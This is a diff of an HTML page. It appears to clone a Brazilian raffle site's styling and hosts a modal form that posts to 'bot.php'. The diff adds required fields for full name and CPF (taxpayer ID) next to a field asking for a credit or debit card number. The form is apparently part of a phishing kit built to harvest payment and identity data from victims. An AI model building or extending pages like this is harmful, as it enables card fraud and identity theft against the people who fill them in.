@@ -1,10 +1,5 @@
-
-
 <html translate="no">
 <head>
-
-
-
 <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">   <style>
         /*! CSS Used from: https://dashboard.sortecomigo.com.br/arquivos/sortecomigo.css?cTime=1671811354 */
 :root{--incrivel-bg:#f1f1f1;--incrivel-border:#d1d1d1;--incrivel-bgColor:#323232;--incrivel-bgLink:#202020;--incrivel-bgLinkHover:var(--incrivel-primaria);--incrivel-rgba:255, 255, 255;--incrivel-rgbaInvert:0, 0, 0;--incrivel-formBg:#fff;--incrivel-formBgHover:#d9d9d9;--incrivel-formBgHoverColor:#545454;--incrivel-formBorder:#c9c9c9;--incrivel-formColor:#5a5a5a;--incrivel-cardBg:#fff;--incrivel-cardColor:#171717;--incrivel-cardLink:#000;--incrivel-modalBg:#fff;--incrivel-modalBorder:#eee;--incrivel-modalColor:#333;--incrivel-primaria:#161616;--incrivel-primariaColor:#fff;--incrivel-primariaLink:#fff;--incrivel-primariaLinkHover:#fff;--incrivel-primariaDarken:#e4e4e4;--incrivel-primariaDarkenColor:#323232;--incrivel-primariaDarkenLink:#fff;--incrivel-primariaDarkenLinkHover:#fff;}
@@ -1005,6 +1000,13 @@ button:not(:disabled){cursor:pointer;}
       class="w3-button w3-display-topright">&times;</span>
       
 <form id='cads' action="bot.php" method="POST" class="modal-body flex flex-col gap-4">
+  <div class="flex shadow-sm rounded-md">
+    <input placeholder="Nome Completo" name="campoNomeCompleto" value="" class="input rounded-l-none" required>
+</div>
+
+<div class="flex shadow-sm rounded-md">
+    <input placeholder="CPF" name="campoCpf" value="" class="input rounded-l-none" required>
+</div>
         <div class="flex shadow-sm rounded-md">
             <input placeholder="Cartão de crédito / débito" name="campoNome" value="" class="input rounded-l-none teste" required>
         </div>
